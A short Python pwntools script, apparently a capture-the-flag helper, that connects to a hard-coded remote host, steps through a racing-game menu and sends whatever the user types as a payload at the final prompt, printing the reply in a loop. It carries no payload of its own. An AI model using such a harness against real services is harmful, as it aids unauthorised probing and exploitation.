from pwn import * 

context.log_level = 'error'
r = remote('123.232.142.125', 8000)

def exploit(payload: str):
  r.sendlineafter(b'Name', b'1')
  r.sendlineafter(b'Nickname', b'akira')
  r.sendlineafter(b'selection', b'1')
  r.sendlineafter(b'car', b'2')
  r.sendlineafter(b'Circuit', b'2')
  r.sendlineafter(b'victory?', bytes(payload, encoding='utf-8'))
  r.recv()
  print(r.recv().decode('utf-8'))
  r.close()

if __name__ == '__main__':
  while True:
    exploit(input('exploit : '))
